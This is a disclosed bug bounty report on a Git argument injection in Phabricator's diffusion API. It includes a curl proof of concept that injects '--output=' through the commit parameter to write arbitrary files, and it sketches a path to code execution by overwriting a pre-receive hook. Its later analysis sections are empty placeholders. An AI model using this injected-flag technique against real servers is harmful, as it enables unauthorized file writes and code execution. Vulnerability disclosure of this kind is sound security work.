---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1070247'
original_report_id: '1070247'
title: Git flag injection leads to arbitrary file write
weakness: Path Traversal
team_handle: phabricator
created_at: '2021-01-02T16:03:35.395Z'
disclosed_at: '2021-07-25T15:13:13.761Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 54
tags:
- hackerone
- path-traversal
---

# Git flag injection leads to arbitrary file write

## Metadata

- HackerOne Report ID: 1070247
- Weakness: Path Traversal
- Program: phabricator
- Disclosed At: 2021-07-25T15:13:13.761Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

keyword : mongoose

#PoC
1.  Login and generate API token
2. Create a repo and push several commits to phabricator
3. Execute diffusion api
```
curl http://dev.localhost/api/diffusion.internal.gitrawdiffquery \
    -d api.token=api-token \
    -d commit=--output%3D/tmp/qqq \
    -d repository=R2
```

4. `qqq` file will be created in `tmp` directory. And the content of  `qqq` contains the output of git log.

#Description
`git log` command is used to show git history in phabricator. 
API such as diffusion.internal.gitrawdiffquery and [several others](https://sourcegraph.com/search?q=repo:%5Egithub%5C.com/phacility/phabricator%24+%22%27log+%22+-file:test+count:1000&patternType=regexp&case=yes) use git log command to retrieve commit details.
Because lack of validation of `commit` parameter, [this line](https://github.com/phacility/phabricator/blob/b2ab18f8f3d0cbab55b92da7a5fcbc0e148a4c99/src/applications/diffusion/conduit/DiffusionInternalGitRawDiffQueryConduitAPIMethod.php#L99:20) will create command below when PoC is executed

```
git log -n1 -M -C -B --raw -t 'abbrev=40' --pretty-format: '--output=/tmp/qqq'
```

The content of `qqq` after api is executed.
```
$ cat /tmp/qqq
:100644 100644 848bd2831d44979d9e9ad553401d513b1d591c68 4f2e7bd7f250114d6b14fcf3a775391f49e85ed0 M      a.c
```

Notice that `/tmp/qqqq` is controllable path. By specifying the right path it is possible to do arbitrary write.

If `/var/repo` is owned by `www-data`, attacker could rewrite `pre-receive` hook by commit filename `; ls` which the payload would be like file below.

```
$ cat /tmp/qqq
:100644 100644 848bd2831d44979d9e9ad553401d513b1d591c68 4f2e7bd7f250114d6b14fcf3a775391f49e85ed0 M      ; ls
```

This could be result in RCE when the next time `pre-receive` hook is called.

## Impact

Arbitrary file write in phabricator server. Depends on server configuration, it could result in RCE.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
